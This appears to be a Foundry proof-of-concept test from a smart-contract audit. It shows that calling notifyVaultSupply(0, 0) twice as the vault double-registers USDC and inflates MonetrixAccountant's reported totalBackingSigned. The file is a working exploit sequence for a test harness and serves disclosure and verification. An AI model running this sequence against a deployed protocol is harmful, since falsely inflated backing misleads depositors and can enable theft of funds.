// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "test/simulator/SimulatorBase.sol";
import "../src/core/MonetrixAccountant.sol";

contract AuditAgentPoC is SimulatorBase {
    function test_exploit() public {
        console.log("=== Starting test_exploit ===");
        console.log("block.timestamp:", block.timestamp);

        // ATTACK TIMELINE:
        // 1. [Setup] Deposit USDC into the vault to establish a baseline backing and ensure vault holds USDC.
        // 2. [T=1] Record initial totalBackingSigned.
        // 3. [T=2] Attacker (operator) pranks vault to call notifyVaultSupply(0, 0) twice, registering USDC (spotToken 0) twice in vaultSupplied.
        // 4. [T=3] Call totalBackingSigned() again. The USDC balance is now double-counted by _readL1Backing.
        // 5. [Assert] Verify totalBackingSigned has artificially inflated without any new assets being added.

        address victim = address(0x1234567890123456789012345678901234567890);
        vm.deal(victim, 100 ether);
        console.log("Victim funded with 100 ether");

        // Deposit USDC to give the vault a balance
        console.log("Calling _deposit(victim, 10_000e6)");
        _deposit(victim, 10_000e6);
        console.log("_deposit completed");

        // Record initial backing
        console.log("Calling accountant.totalBackingSigned() [1]");
        int256 backingBefore = accountant.totalBackingSigned();
        console.log("Step 1: backingBefore =", backingBefore);

        // Attacker registers USDC (spotToken 0) twice in vaultSupplied
        // by pranking the vault and calling notifyVaultSupply
        console.log("Starting prank as vault:", address(vault));
        vm.startPrank(address(vault));

        console.log("Calling accountant.notifyVaultSupply(0, 0) [1]");
        accountant.notifyVaultSupply(0, 0);
        console.log("notifyVaultSupply [1] completed");

        console.log("Calling accountant.notifyVaultSupply(0, 0) [2]");
        accountant.notifyVaultSupply(0, 0);
        console.log("notifyVaultSupply [2] completed");

        vm.stopPrank();
        console.log("Prank stopped");

        console.log("Calling accountant.vaultSuppliedLength()");
        uint256 suppliedLen = accountant.vaultSuppliedLength();
        console.log("Step 2: vaultSuppliedLength =", suppliedLen);

        // Check backing after
        console.log("Calling accountant.totalBackingSigned() [2]");
        int256 backingAfter = accountant.totalBackingSigned();
        console.log("Step 3: backingAfter =", backingAfter);

        // Assert that backing is inflated
        int256 inflation = backingAfter - backingBefore;
        console.log("Calculated inflation =", inflation);

        assertGt(inflation, 0, "Phantom backing inflation occurred due to double counting");
        assertGt(backingAfter, backingBefore, "Backing should be inflated due to double counting");

        console.log("=== test_exploit finished successfully ===");
    }
}
